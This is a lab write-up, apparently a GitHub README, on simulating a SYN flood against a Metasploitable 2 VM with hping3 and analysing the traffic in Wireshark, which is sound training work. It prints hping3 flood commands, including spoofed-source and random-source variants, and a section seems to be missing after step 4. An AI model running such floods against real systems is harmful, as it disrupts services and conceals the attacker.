# 📝 DDoS Simulation Lab Notes

## 🧠 Objective

Simulate a simple DDoS (SYN flood) attack on a Metasploitable 2 VM from Kali Linux and analyze the packet traffic using Wireshark.

---

## 💽 Lab Setup

* **Attacker**: Kali Linux (running `hping3`)
* **Target**: Metasploitable 2
* **Monitor**: Wireshark running on attacker machine
* **Virtualization**: VirtualBox with Host-Only Adapter

---

## Detailed Methodology

### 1.
Started metasploit 2 and checked ```ifconfig``` the ip address of the victim machine.
![Ddos lab](https://github.com/HariCyber-Sec/ddos-simulation-lab/blob/main/screenshots/1.jpg)
### 2.
Logged into kali and ping the victim machine to check the network connection.
![Ddos lab](https://github.com/HariCyber-Sec/ddos-simulation-lab/blob/main/screenshots/5.jpg)
ping was a success.
### 3.
Accessed the victim machine by navigating to `http://192.168.56.101/` in the browser using an unsecured HTTP connection.
![Ddos lab](https://github.com/HariCyber-Sec/ddos-simulation-lab/blob/main/screenshots/2.jpg)
### 4.
Navigated to the DVWA application, and logged in to monitor real-time behavior and performance impact during the DDoS attack.
![Ddos lab](https://github.com/HariCyber-Sec/ddos-simulation-lab/blob/main/screenshots/4.jpg)




* `-S`: SYN flag
* `--flood`: send packets as fast as possible
* `-V`: verbose mode

### 2. SYN Flood with Spoofed Source IP

```bash
hping3 -S 192.168.56.102 -a 10.10.10.10 -p 80 --flood
```

* `-a`: spoofed IP address
* `-p`: destination port

### 3. SYN Flood with Randomized Source IPs & Payload

```bash
hping3 -S 192.168.56.102 -d 120 -p 80 --flood --rand-source
```

* `-d`: data size of each packet (in bytes)
* `--rand-source`: use random source IPs

> 📌 Tip: Run all commands as root for full functionality

---

## 🧪 Observations During Attack

* CPU usage on Metasploitable 2 spiked
* Network became unresponsive to ping after sustained SYN flooding
* Wireshark captured high volume of SYN packets, some with spoofed or random IPs

---

## 🔍 Wireshark Filters Used

To analyze SYN flood pattern:

```wireshark
tcp.flags.syn == 1 && tcp.flags.ack == 0
```

To monitor TCP connections:

```wireshark
tcp.analysis.flags
```

---

## 📂 Files

* `wireshark-captures/ddos-attack.pcapng`: Full capture of SYN flood
* `scripts/hping3_ddos.sh`: Simple bash script to run attack variants

---

## 📸 Screenshots Collected

* ![Kali attack terminal](../screenshots/kali-attack.png)
* ![Metasploitable CPU usage](../screenshots/metasploitable-target.png)
* ![Wireshark SYN flood](../screenshots/wireshark-analysis.png)
* ![Random IP SYN packets](../screenshots/random-source-syn.png)
* ![Spoofed IP attack](../screenshots/spoofed-ip-syn.png)

---

## ✅ Summary

This simulation demonstrates how different types of SYN flood attacks (including spoofed and randomized source IPs) generate abnormal traffic that can be identified using packet inspection tools like Wireshark. All actions were performed in an ethical, isolated test lab.

---

## ⚠️ Disclaimer

This project is for **educational purposes only** and was performed in a controlled lab environment. Never use these techniques on systems you do not own or have explicit permission to test.
